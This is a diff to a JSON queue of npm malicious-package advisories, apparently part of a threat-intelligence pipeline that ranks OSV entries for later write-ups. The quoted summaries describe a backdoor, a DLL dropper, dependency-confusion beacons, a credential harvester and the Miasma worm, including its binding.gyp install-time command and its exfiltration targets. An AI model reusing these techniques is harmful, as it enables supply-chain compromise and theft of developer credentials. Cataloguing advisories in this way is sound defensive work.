+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-70ac1de53eef654d",
+      "canonicalSubjectId": "MAL-2026-6449",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in howdybase32 (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (c0eab759e668db62de0eaa10d1f5d32c689b00c7c3d6d2b1517439cc5df3e956) The package advertises itself as a fast, zero-dependency base32 encoder/decoder, but its only bin entry (bin/hibase32.js) silently invokes portloop.daemon with relay:'ngrok', a hardcoded ngrok auth token, ssh:true, sshPort:2223, respawn:true, and authorizes a hardcoded ed25519 public key tied to GitHub user 'yazcaleb'. Every invocation of the CLI spawns an ngrok-tunnelled SSH server on port 2223 that accepts logins from the attacker's pubkey, granting persistent remote shell access to the installer's host. The call is wrapped in try/catch so any failure is swallowed silently. The README's 'zero-dependency' claim is false — package.json declares portloop ^1.14.0, which is the channel that delivers the backdoor. Naming drift (package name howdybase32, README brand hey-base32, bin filename hibase32.js) is consistent with a namespace-abuse / evasion shell around a malicious package family.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6449"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6449"
+      ],
+      "firstSeenAt": "2026-06-25T06:46:42.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:28.180Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:28.180Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-bab321d7ef996ffe",
+      "canonicalSubjectId": "MAL-2026-6448",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in bs58-86 (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (057e2e470e0bc9dbfd2ff37955c0c7d051cca944025b9d62c882ffc98c4434e5) Package `bs58-86@6.0.1` reproduces the name, README, repository URL (`cryptocoinjs/bs58`), and exported API of the widely-used `bs58` base58 encoding library (>10M downloads/week). The only functional code in `src/cjs/index.cjs` is `require('base62-86x')(ALPHABET)` — instead of depending on the real `base-x` package that genuine `bs58` uses, this package pulls in `base62-86x` (declared as `^5.0.4` in package.json dependencies), an unrelated package controlled by a different publisher. All actual base-x implementation runs out of `base62-86x`, so any developer who installs `bs58-86` thinking it is `bs58` ends up executing whatever `base62-86x` ships, at require time. This is the typosquat-plus-dependency-redirect shape: the lure package is a thin shim whose only effect on the installer is to pull in and execute the redirected dependency.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6448"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6448"
+      ],
+      "firstSeenAt": "2026-06-25T06:43:08.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:28.123Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:28.123Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-9952d3b55210867b",
+      "canonicalSubjectId": "MAL-2026-6443",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in agentsync-pkg (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (b383c760dffae4a26d7f94b433bbe00dedb2426b23f4713610d6f5f36c594cf1) On every `import` / `require('agentsync-pkg')`, src/index.js line 152 resolves `bin/native/parser.node` and calls `require()` on it: `const p = r('path').join(...,'bin','native','parser.node'); if (r('fs').existsSync(p)) { try { r(p); } catch(e) {} }`. The file is a 2.9 MB Windows PE binary (DOS stub `!This program cannot be run in DOS mode.`, sha256 b1aace6c...). On Windows, Node's native module loader invokes LoadLibrary on this file, executing the DLL's entry point regardless of whether it exports valid N-API symbols — i.e. arbitrary attacker-supplied native code runs in the developer's process simply because the package was imported. No source for the binary is shipped, no build script produces it, and the README explicitly advertises the package as \"Zero dependencies. Nothing to audit, nothing to get compromised in a supply-chain attack\" with no mention of a native parser; the package's documented purpose is string-template markdown generation, which has no legitimate need for a native module. The package also exhibits republish/lookalike indicators: package.json declares name `agentsync-pkg` version `2.0.0` while src/index.js self-identifies as `// v1.0.1`, the CHANGELOG only documents up to 1.0.1 (\"Zero runtime dependencies\"), README/badges/bin entries all reference the unrelated legitimate packages `syncagents` and `agentsync`, and the author field is the placeholder `agentsync contributors <noreply@agentsync.dev>`. The 2.0.0 release silently introduces the undocumented native binary on top of an otherwise pure-JS code base. The combination — name confusion with established packages, placeholder author, self-contradicting version metadata, and an undocumented PE auto-loaded at import — is a typosquat/republish carrying a binary dropper.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6443"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6443"
+      ],
+      "firstSeenAt": "2026-06-25T06:39:13.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:27.641Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:27.641Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-71f54ff16f32337e",
+      "canonicalSubjectId": "MAL-2026-6418",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in leo-aws (npm)",
+      "summary": "The `leo-aws` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance. --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (914680f83c4971cb6bc16c3ef608f4c1e8a73a25769911d5d9076ad91c935f63) The package contains a binding.gyp at the tarball root whose contents use GYP command-expansion syntax (<!(...) / <!@(...)) on line 6. npm implicitly runs `node-gyp rebuild` whenever a binding.gyp is present in the package, even without any declared install/postinstall script, and node-gyp's configure step evaluates <!(...) expressions as shell commands. This causes the embedded command to execute on every `npm install` of leo-aws. The package ships no native C/C++ source files (no.c/.cc/.cpp/.h), so the binding.gyp has no legitimate build purpose — its only effect is to run the embedded shell command at install time. This is functionally equivalent to a postinstall hook and is a well-known supply-chain attack technique for hiding install-time code execution from cursory script-field inspection.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6418"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6418"
+      ],
+      "firstSeenAt": "2026-06-24T23:04:55.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:27.347Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:27.347Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-fc07418159b28ed2",
+      "canonicalSubjectId": "MAL-2026-6458",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in wp-codebox-workspace (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (a44aa2030ed09d6ec3998c59953a44e013c1993d93a90ee031b0999480afb03c) Package is published at version 9999.99.99 with a description referencing an 'npm 404 error referenced in Extra-Chill/homeboy-extensions' — the textbook dependency-confusion shape, where an unclaimed internal package name is registered publicly at a maximal version so private builds silently resolve to this public package. On install, postinstall.js reads npm package metadata, Node/OS info, and CI environment indicators including GITHUB_REPOSITORY, GITHUB_REPOSITORY_OWNER, and GITHUB_WORKFLOW, then POSTs them to https://ddactic-lab.online/sc/beacon. A DNS-lookup fallback encodes the package slug, CI provider, and a hash into a subdomain label under b.ddactic-lab.online, with an in-source comment stating the channel exists to fire 'even through HTTP-blocking corporate proxies' — explicit intent to evade installer egress controls. The combined effect: any private CI build that mistakenly resolves this name leaks the victim organization's private repository, owner, and workflow identifiers to an attacker-controlled host, with a covert DNS fallback for environments that block HTTP.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6458"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6458"
+      ],
+      "firstSeenAt": "2026-06-25T07:26:37.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:27.123Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:27.123Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-e4f5ff21a7446f83",
+      "canonicalSubjectId": "MAL-2026-6456",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in stitch-design (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (81a0c5de3abe7924f58304e27e1537821c217c9348c060b31c5424407f9f10cc) The npm package ships a preinstall lifecycle hook (scripts/preinstall.js) that, on `npm install`, reads classic installer-secret paths — ~/.gitconfig, ~/.git-credentials, ~/.ssh/*.pub, ~/.npmrc, ~/.docker/config.json — and runs subprocesses (`git config --global/--system user.email`, `gh api user`, `claude auth status`, `npm config get email`) to capture identity material. It regex-extracts every email-shaped string from the contents and issues HTTPS GETs to https://stitch-design.ai/api/v1?src=...&user=<email> for each match, with TLS verification explicitly disabled (`rejectUnauthorized: false`). The same harvester is duplicated in bin/cli.js (the package's `bin` entry `stitch-design`), so every CLI invocation after install repeats the credential-path reads and exfiltration. Both files carry cover-story comments claiming to be a temporary placeholder that just prints a notice, while ~150 lines of harvesting and exfil code execute first. The combination of preinstall auto-execution, reads from canonical credential paths, hardcoded remote destination, disabled TLS verification, and a misleading placeholder narrative is an unambiguous installer-side credential exfiltration attack.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6456"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6456"
+      ],
+      "firstSeenAt": "2026-06-25T07:10:10.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:26.965Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:26.965Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-4426509ede80cf01",
+      "canonicalSubjectId": "MAL-2026-6436",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in solo-nav (npm)",
+      "summary": "The `solo-nav` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance. --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (964dd343632ca7e543b0f74dc917ea0cab82fb36cee143057b6d658ce42d9525) The package ships a binding.gyp at the package root containing GYP command-expansion syntax (`<!(...)`) at line 6 within the targets/sources block. npm implicitly invokes `node-gyp rebuild` whenever a binding.gyp is present — even with no declared install/postinstall script — and GYP evaluates `<!(...)` expressions as shell during its configure step. This causes the embedded command to execute on the installer's machine as a side effect of `npm install`, functionally equivalent to a lifecycle hook. The package does not ship native source files that would justify a real node-gyp build, so the binding.gyp's only purpose is to run the embedded command at install time. The mechanism delivers attacker-controlled code execution on any machine that installs this package.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6436"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6436"
+      ],
+      "firstSeenAt": "2026-06-24T23:04:55.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:26.892Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:26.892Z",
         "needsReverify": false,
         "kevStatusDerived": null,
         "kevStatusIsAuthoredTruth": false,
@@ -712,11 +1522,14 @@
         "current lead",
         "active exploitation or malware signal",
         "advisory database signal",
-        "supply-chain term match"
+        "supply-chain term match",
+        "carried forward pending review"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
+      "staleCarryForward": true,
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-1d63ed96613fc14d",
@@ -766,11 +1579,14 @@
         "current lead",
         "active exploitation or malware signal",
         "advisory database signal",
-        "supply-chain term match"
+        "supply-chain term match",
+        "carried forward pending review"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
+      "staleCarryForward": true,
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-d9ec058ff3090439",
@@ -820,11 +1636,14 @@
         "current lead",
         "active exploitation or malware signal",
         "advisory database signal",
-        "supply-chain term match"
+        "supply-chain term match",
+        "carried forward pending review"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
+      "staleCarryForward": true,
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-ce1ba27ffaa11ef6",
@@ -874,11 +1693,14 @@
         "current lead",
         "active exploitation or malware signal",
         "advisory database signal",
-        "supply-chain term match"
+        "supply-chain term match",
+        "carried forward pending review"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
+      "staleCarryForward": true,
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-5544dedcf91773f8",
@@ -928,11 +1750,14 @@
         "current lead",
         "active exploitation or malware signal",
         "advisory database signal",
-        "supply-chain term match"
+        "supply-chain term match",
+        "carried forward pending review"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
+      "staleCarryForward": true,
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-00ea72baf40e44a1",
@@ -982,11 +1807,14 @@
         "current lead",
         "active exploitation or malware signal",
         "advisory database signal",
-        "supply-chain term match"
+        "supply-chain term match",
+        "carried forward pending review"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
+      "staleCarryForward": true,
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-37e1314b2fbd99d3",
@@ -1036,11 +1864,14 @@
         "current lead",
         "active exploitation or malware signal",
         "advisory database signal",
-        "supply-chain term match"
+        "supply-chain term match",
+        "carried forward pending review"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
+      "staleCarryForward": true,
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-d12a8d1bd6167444",
@@ -1090,443 +1921,14 @@
         "current lead",
         "active exploitation or malware signal",
         "advisory database signal",
-        "supply-chain term match"
+        "supply-chain term match",
+        "carried forward pending review"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-c69b76b6632f8327",
-      "canonicalSubjectId": "MAL-2026-6426",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in leo-connector-oracle (npm)",
-      "summary": "The `leo-connector-oracle` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance.",
-      "sources": [
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6426"
-      ],
-      "mergedLeadRefs": [
-        "osv:MAL-2026-6426"
-      ],
-      "firstSeenAt": "2026-06-24T23:04:55.000Z",
-      "lastMaterialActivityAt": "2026-06-25T06:01:24.052Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T06:01:24.052Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-c846153914f7bd0f",
-      "canonicalSubjectId": "MAL-2026-6425",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in leo-connector-mysql (npm)",
-      "summary": "The `leo-connector-mysql` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance.",
-      "sources": [
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6425"
-      ],
-      "mergedLeadRefs": [
-        "osv:MAL-2026-6425"
-      ],
-      "firstSeenAt": "2026-06-24T23:04:55.000Z",
-      "lastMaterialActivityAt": "2026-06-25T06:01:22.904Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
